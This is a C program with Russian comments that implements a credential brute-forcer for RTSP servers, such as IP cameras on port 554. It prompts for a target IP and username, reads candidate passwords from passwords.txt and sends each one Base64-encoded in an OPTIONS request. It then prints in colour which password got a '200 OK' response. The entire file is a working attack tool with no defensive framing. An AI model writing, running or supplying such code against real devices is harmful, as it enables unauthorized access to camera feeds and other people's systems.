#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024
#define PASSWORD_LENGTH 100

// Таблица Base64
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Кодировка в base64
char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
    size_t i, j;
    *output_length = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(*output_length + 1);
    if (encoded_data == NULL) return NULL;

    for (i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        encoded_data[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded_data[j++] = base64_table[triple & 0x3F];
    }

    for (i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded_data[*output_length - 1 - i] = '=';

    encoded_data[*output_length] = '\0';
    return encoded_data;
}

// Брутфорс RTSP
void rtsp_bruteforce(const char *target_ip, int target_port, const char *username, const char *password) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char response[BUFFER_SIZE];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Сокет ошибка");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Ошибка подключения");
        close(sock);
        return;
    }

    // 🔐 Создаём строку user:pass
    char auth_raw[200];
    snprintf(auth_raw, sizeof(auth_raw), "%s:%s", username, password);

    // 🔐 Кодируем в base64
    size_t encoded_length;
    char *auth_encoded = base64_encode((const unsigned char *)auth_raw, strlen(auth_raw), &encoded_length);

    // 📡 Формируем RTSP-запрос
    snprintf(request, sizeof(request),
             "OPTIONS rtsp://%s/ RTSP/1.0\r\n"
             "CSeq: 1\r\n"
             "Authorization: Basic %s\r\n\r\n",
             target_ip, auth_encoded); // ← вот здесь вставляется base64

    // Отправляем
    send(sock, request, strlen(request), 0);

    // Получаем ответ
    recv(sock, response, sizeof(response) - 1, 0);
    response[sizeof(response) - 1] = '\0';

    // ✅ Проверка ответа
    if (strstr(response, "200 OK") != NULL) {
        printf("\033[0;32m[✔] Успешный пароль: %s\033[0m\n", password); // Зелёный
    } else {
        printf("\033[0;31m[✘] Неверный пароль: %s\033[0m\n", password); // Красный
    }

    free(auth_encoded);
    close(sock);
}

int main() {
    char target_ip[16];
    int target_port = 554;
    char username[100];

    printf("Введите IP RTSP сервера: ");
    scanf("%15s", target_ip);

    printf("Введите логин (например admin): ");
    scanf("%99s", username);

    FILE *file = fopen("passwords.txt", "r");
    if (!file) {
        perror("Не удалось открыть файл passwords.txt");
        return 1;
    }

    char buffer[PASSWORD_LENGTH];
    while (fgets(buffer, PASSWORD_LENGTH, file) != NULL) {
        buffer[strcspn(buffer, "\n")] = 0;
        rtsp_bruteforce(target_ip, target_port, username, buffer);
    }

    fclose(file);
    return 0;
}
